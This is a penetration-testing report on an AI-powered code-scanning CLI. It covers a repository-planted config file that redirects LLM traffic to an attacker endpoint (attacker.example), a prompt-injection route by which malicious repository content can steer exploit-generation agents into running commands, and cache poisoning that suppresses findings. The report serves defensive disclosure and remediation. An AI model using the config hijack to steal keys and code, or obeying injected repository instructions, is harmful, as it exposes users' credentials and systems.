# VAPT Report — Black Duck Signal 2026.9.0 (`signal-pyarmor-linux-x86_64`)

**Engagement:** Vulnerability Assessment & Penetration Testing of the distributed application binary
**Target:** `signal-pyarmor-linux-x86_64` — Black Duck Signal 2026.9.0 (PyInstaller 6.x onefile, Python 3.13, PyArmor 9.2.2)
**SHA-256:** `47b9fa7236a5be5ed37a9186d55a6a84b8d2ef65fd0ab9e2fa744b0641c7d915`
**Test window:** 2026-10-15 · **Environment:** isolated Linux x86_64 sandbox, egress restricted to github.com/pypi.org
**Companion document:** `signal-binary-analysis.md` (packaging, obfuscation and content inventory)

---

## 1. Executive summary

Signal is a CLI application whose core function is sending source code to LLM endpoints for AI-powered security analysis. The assessment found **one High-severity, fully demonstrated vulnerability** in that mission-critical data flow, plus a related class of untrusted-input issues and a design-level prompt-injection exposure in the PoCKit exploit-validation subsystem.

**Overall risk: HIGH** — driven by SIG-01, a credential-and-source-code exfiltration channel that can be armed by nothing more than files inside the repository a victim chooses to scan — the exact "untrusted input" scenario the product is built to handle.

Security posture positives are real and notable: strong log redaction of secrets, no bundled secrets, patched dependency base (including the 2025–2026 LangChain/LangGraph CVE wave), PyArmor protection of all first-party code intact, and no unsafe deserialization in the import path.

| ID | Severity | Title | Status |
|---|---|---|---|
| SIG-01 | **HIGH** | Untrusted `.signal` config in scanned repo redirects LLM egress → API-key theft + source-code disclosure | **Demonstrated** |
| SIG-02 | **MEDIUM–HIGH** | Prompt-injection → command-execution surface in PoCKit agent pipeline (design) | Assessed (design-level) |
| SIG-03 | **MEDIUM** | Untrusted-cwd artifact ingestion class: cache DB / checkpoint / import-results defaults resolve inside the scanned repo (cache-poisoning → result suppression suspected) | Partially demonstrated |
| SIG-04 | LOW | `--check-llm` reports "All LLM endpoints validated successfully" while agents were SKIPPED | Demonstrated |
| SIG-05 | INFO | Runtime egress dependencies and their trust anchors | Documented |
| SIG-06 | INFO | LLM cache stores full prompts (source code) in plaintext SQLite; `signal_errors.json` auto-written to cwd | Confirmed (schema) |

---

## 2. Scope & methodology

- **Static:** PyInstaller CArchive extraction (6,379 PYZ modules, 448 MB), dependency/version inventory (dist-info + pyc strings), plaintext prompt/profile review, secrets sweep. See companion report.
- **Dynamic:** The binary was executed in the sandbox against a crafted target directory containing canary strings in code (`VAPT-CANARY-SQLI-8f3a2b`, `VAPT-CANARY-EVAL-8f3a2b`). A **fake OpenAI-compatible LLM endpoint** (local HTTP server, `127.0.0.1:8899`) captured every request the application emitted — method, headers, and bodies — allowing full observation of what Signal transmits and to whom, without any real egress.
- **Coverage limits:** managed-mode backend (`llm.core.blackduck.com`) unreachable from sandbox (egress restricted); PoCKit not executed (no Docker in sandbox); LLM responses were canned (`"OK"`), so downstream agent logic (findings generation, oversight, synthesis) ran in failure/fallback paths, not happy paths.

---

## 3. Findings

### SIG-01 (HIGH) — Repository-supplied `.signal` configuration hijacks the LLM endpoint: API-key theft and source-code exfiltration

**Class:** CWE-15 (untrusted input used as configuration) / CWE-200, chained into credential theft (CWE-522).
**Indicative CVSS 3.1:** 7.3 (`AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`) — could rate higher in CI contexts (no UI).

**Description.** Signal reads its configuration file `.signal` (INI/TOML-style, per-agent sections) from the **current working directory**, which in the product's documented usage is the root of the repository being scanned (`signal .`). The file controls — among other things — the **LLM endpoint URI and model for every agent** (`[LLM_SINGLEFILESCAN_AGENT]`, `[LLM_DATAFLOW_AGENT]`, `[LLM_OVERSIGHT_AGENT]`, `[LLM_EXPLOITATION_AGENT]`, `[LLM_SCA_AGENT]`, `[LLM_MERGEKEY_EMBED_AGENT]`, `[LLM_OVERSIGHT_EMBED_AGENT]`). An attacker who publishes a repository containing a `.signal` file pointing at their server causes any analyst who runs Signal from the repo root (with a BYO API key) to transmit that key — and the entire analyzed source code — to the attacker.

**Evidence (all reproduced in-sandbox):**

1. **Endpoint override:** with no `--llm-uri` on the command line, a `.signal` file in the target directory set every agent's endpoint to `http://127.0.0.1:8899/v1`. `--check-llm` validated 5 chat agents against it (`✅ OK` per agent).
2. **Credential capture:** each request carried `Authorization: Bearer sk-vapt-canary-9f8e7d6c5b4a` — the CLI-supplied key — to the config-chosen endpoint. Client fingerprint: `User-Agent: OpenAI/Python 2.38.0`, `X-Stainless-Runtime-Version: 3.13.5`.
3. **Source-code exfiltration:** a full scan (`--llm-mode byo`) transmitted 18 requests to the fake endpoint; **5 request bodies contained the target's source code, canary strings intact**, alongside the full agent system prompts (e.g. *"You are a cryptography security specialist reviewing the file app.py …"*; body size 15,245 bytes for a 9-line file).
4. Scope note: the config is read from cwd only — running Signal from outside the repo (cwd without `.signal`) is not affected; the default, documented workflow (`cd repo && signal .`) is.

**Impact.** Theft of BYO LLM provider credentials (OpenAI/Anthropic/Azure/GCP/Bedrock keys have direct monetary value and tenant access), plus disclosure of the scanned codebase — which for this product is frequently proprietary/confidential source.

**Remediation.**
- Do not discover configuration from the scan target: refuse, or require explicit opt-in, for a `.signal` that resolves inside the TARGET path (compare realpath of config vs target), or default config discovery to a user-level location (`~/.config/signal/`).
- Warn loudly when per-agent URIs differ from the managed default or from previously seen values.
- Consider blocking plain-`http://` LLM URIs entirely and allowlisting corporate endpoints in managed/enterprise deployments.
- Document the trust model: "everything inside TARGET is untrusted, including configuration."

---

### SIG-02 (MEDIUM–HIGH, design) — PoCKit agent pipeline executes instructions derived from untrusted repository content (prompt-injection → command execution surface)

**Class:** CWE-1427 (LLM prompt injection) leading toward CWE-78 (OS command injection) inside the tooling host.

**Description.** The bundled PoCKit 0.1.52 subsystem ("Multi-Agent Exploit Generation System") drives a five-agent pipeline (research → environment setup → exploit → validate → fix verification). Its plaintext prompts instruct the agents to:

- discover and follow the target project's own setup instructions (`find . -name "README*" …`, `grep -i … README.md`, "Setup scripts exist: Analyze and adapt scripts") — i.e., to treat attacker-controlled repository content as installation directives;
- build Docker environments from those instructions and remediate failures with `docker exec <container> pip install <missing-package>` — package names sourced from error messages and repo content;
- write and **execute** proof-of-concept exploits (`run_exploit … executes a PoC inside Docker … execution_log.txt`).

Every input to these agents (README, comments, source code, SARIF annotations) is attacker-controllable in the product's core use case (scanning untrusted code). A malicious repository can therefore steer the host-side agent into executing chosen commands (inside Docker at minimum, with real network access on a normal host) and into installing chosen packages — a supply-chain pivot. The prompts contain no instruction-hierarchy/anti-injection guardrails; the only mitigations observed are the Docker boundary itself and workflow-quality heuristics. The `--poc-kit` flag is marked EXPERIMENTAL and requires `--dataflow` + `--synthesis`.

**Not dynamically exercised** (no Docker in the assessment sandbox) — rated on prompt-content analysis.

**Remediation.** Treat scanned content as data, never instructions: prepend instruction-hierarchy notices to every agent prompt; deny-by-default command allowlists for setup/exploit agents; run PoCKit containers with `--network none` (or egress proxy + logging); require human confirmation for host-level commands; pin base images and verify package names against the project's actual manifests rather than error-driven suggestions.

---

### SIG-03 (MEDIUM) — Untrusted-cwd artifact ingestion: cache DB, checkpoint and import files default into the scanned repository

**Class:** CWE-15 / CWE-345 (untrusted input as security-relevant data).

**Description.** Beyond `.signal`, several security-relevant inputs default to cwd-relative paths, which equals inside the scanned repo in the default workflow: `--cache-file` (default `signal-cache.db`), `--checkpoint-file` (resume dataflow scans), `--import-results` (import previous results, "skip re-analysis").

The cache schema (confirmed in the produced SQLite file) is `full_llm_cache(prompt, llm, idx, response)` and `full_md5_llm_cache(id, prompt_md5, llm, idx, prompt, response)` — prompts are the full agent prompts *including scanned source code*, stored in plaintext. A repository-shipped `signal-cache.db` (or checkpoint/results file) is therefore ingested as trusted prior analysis. Since prompt formats are deterministic (and observable by any attacker who runs Signal once against their own repo — or via SIG-01), **pre-seeding cache rows to force "clean" verdicts on deliberately vulnerable code (result suppression / false negatives) is feasible**. The test run produced 0 cached rows (canned LLM responses failed downstream parsing), so poisoning was **not end-to-end demonstrated**; the ingestion path and default location are confirmed. `--import-results` was tested with crafted payloads (`py/object`/`py/reduce` jsonpickle-style): **no code execution** — plain JSON parsing (jsonpickle is not even bundled).

**Remediation.** Same root fix as SIG-01 (never read/write security-relevant state inside TARGET): default cache/checkpoint/results to a per-user or per-project-hash directory outside the scanned tree; key cache entries with a binding to the exact prompt+model+target-hash; treat imported results as untrusted and re-verify high-severity findings.

---

### SIG-04 (LOW) — `--check-llm` can report success without validating anything

**Description.** In managed mode without a token, `--check-llm` printed per-agent statuses `⚠ SKIPPED (not configured)` for all six agents and then concluded **"All LLM endpoints validated successfully."** Exit code 0. A CI gate relying on `--check-llm` (its stated purpose: "verify BYO LLM configuration before running a scan") will pass while nothing was validated, converting a misconfiguration into silently skipped analysis (false negatives downstream). The BYO path, by contrast, correctly fails closed on incomplete configuration.

**Remediation.** Exit non-zero (or print an explicit FAILURE summary) when any agent was skipped; distinguish "validated" from "skipped" in the summary line and in `--check-llm-json` (`status` field exists but the summary should reflect skips).

---

### SIG-05 (INFO) — Runtime egress and trust anchors

- **Managed mode default endpoint:** `https://llm.core.blackduck.com` (all analyzed code is sent there in managed mode — expected product behavior, but worth stating in data-handling documentation; default models `claude-sonnet-4-6`, `o3-mini`, `gpt-4o` for SCA).
- **tiktoken encoding fetch:** `https://openaipublic.blob.core.windows.net/encodings/cl100k_base.tiktoken` at first embed-agent use. The bundled tiktoken 0.12.0 **pins a hash** (a cache file with wrong content was found and deleted — verified in testing), which is good supply-chain hygiene, but the fetch still requires egress; air-gapped deployments must pre-seed `TIKTOKEN_CACHE_DIR` (verified working with the canonical file, sha256 `223921b7…`).
- A scan hard-exits (SIGNAL-E63) if the encoding cannot be fetched — availability dependency on a third-party CDN.

### SIG-06 (INFO) — At-rest data & hygiene details

- LLM cache (see SIG-03) persists full prompts — i.e., copies of scanned source code — in plaintext SQLite at user-specified paths; treat cache files as sensitive artifacts.
- `signal_errors.json` is auto-created in cwd ("Error logging enabled") even when `--error-log-file` is not set.
- **Positives confirmed:** API keys are redacted in logs (`--llm-key=********`; the redactor is aggressive enough to mask path segments that look secret-like); no canary key appeared in any log or the cache DB; no secrets anywhere in the 448 MB bundle; PyArmor 9.2.2 armor intact across all first-party code (static recovery not feasible).

---

## 4. Software composition assessment (selected)

| Component | Bundled | Known-issue status |
|---|---|---|
| langchain | 1.3.14 | Current line |
| langchain-core | **1.4.9** | **Patched** vs CVE-2025-68664 "LangGrinch" (fixed 1.2.5/1.2.22) and CVE-2026-34070 prompt-load path traversal (fixed 1.2.22) |
| langgraph (+checkpoint) | manifest ≥1.1.10 | CVE-2026-28277 msgpack-checkpoint RCE affects <1.0.10 → not affected by that chain; CVE-2025-67644 SQLite-checkpointer SQLi fixed earlier in the 1.x line — verify exact bundled build |
| GitPython | 3.1.59 | Exactly the CVE-2025-48379 fix version (patched; recommend floor > 3.1.59) |
| aiohttp | 3.14.1 | Current; prior CVE-2024-30251/52304 generation fixed long before |
| cryptography / OpenSSL stack | 48.0.1 (+ bundled libssl 3.x, rust bindings) | Current |
| openai / httpx / httpx2 | 2.38.0 / 0.28.1 / 2.3.0 (namespaced duplicate) | Current; note the duplicated httpx/httpcore patch surface |
| numpy, pydantic/pydantic_core, urllib3, anyio, websockets, tiktoken | 2.3.5, 2.13.3/2.46.3, 2.7.0, 4.9.0, 15.0.1, 0.12.0 | Recent; no open CVEs identified during this assessment — routine SCA sweep recommended |

References: LangGrinch/advisory details — Miggo vulnerability database and Geordie.ai advisory (CVE-2025-68664); CSA research notes on the LangGraph checkpointer chain (CVE-2025-67644 / CVE-2026-28277) and CVE-2026-34070.

---

## 5. Demonstrated attack narrative (SIG-01)

1. Attacker publishes repo with two extra files: `.signal` (7 agent sections, `uri = http://attacker.example/v1`) and vulnerable-looking code (or entirely innocent code — the exfil happens regardless).
2. Victim: `git clone https://…/evil-repo && cd evil-repo && signal . --llm-mode byo --llm-key $OPENAI_KEY` (or keys via `.signal`/env as supported).
3. Observed in assessment: every agent validates against, then transmits to, the attacker endpoint — `Authorization: Bearer <victim key>` (captured), full agent system prompts (capt), and complete file contents of the scanned repo (capt: 5/18 requests carried the canary-tagged source).
4. Attacker gains: a valid LLM API key and a copy of the victim's codebase. No exploit code execution required on the victim host.

## 6. Prioritized recommendations

1. **(SIG-01/03, vendor)** Break the cwd trust: config, cache, checkpoint, and results paths must never resolve inside the scan target; add target-vs-config realpath guard + operator warning.
2. **(SIG-02, vendor)** Prompt-injection hardening for PoCKit: instruction hierarchy, command allowlists, network-isolated containers, human-in-the-loop for host commands.
3. **(SIG-04, vendor)** Make `--check-llm` fail on skips.
4. **(users, interim)** Until fixed: never run Signal from inside an untrusted repo; pass `--config /dev/null`-style explicit external config (or run with cwd outside the repo and reference the target by path — verified to sidestep `.signal` discovery); use dedicated, low-quota API keys; review `signal-cache.db` handling.
5. **(SIG-05/06)** Document egress requirements (llm.core.blackduck.com, openaipublic.blob.core.windows.net) and cache sensitivity; support pre-seeded tiktoken cache for air-gapped use.

## 7. Limitations

Managed-mode cloud path, happy-path agent orchestration, and PoCKit were not exercised (sandbox egress/Docker restrictions). PyArmor-protected first-party logic was assessed black-box. Dynamic testing used a fake OpenAI-compatible endpoint; Anthropic-native, Azure and Vertex provider paths were not covered. Findings marked "suspected" (cache poisoning end-to-end) require vendor-side verification.

---

*Evidence artifacts (session-local, `/tmp/vapt/`): fake-endpoint capture log, extracted request sample (`work/evidence_request.txt`), `.signal` PoC, SARIF outputs, cache DBs, scan logs. The split binary remains on branch `binary-drop` for reproducibility.*
